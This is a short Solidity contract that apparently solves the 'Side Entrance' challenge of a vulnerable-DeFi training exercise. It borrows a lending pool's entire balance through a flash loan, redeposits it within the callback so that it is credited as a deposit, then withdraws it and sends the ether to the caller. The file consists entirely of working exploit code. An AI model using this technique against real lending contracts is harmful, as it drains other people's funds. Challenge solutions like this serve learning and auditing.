// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool public immutable pool;

    constructor(address pool_) {
        pool = SideEntranceLenderPool(pool_);
    }

    function attack() external payable {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        payable(msg.sender).transfer(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}

    fallback() external payable {}
}
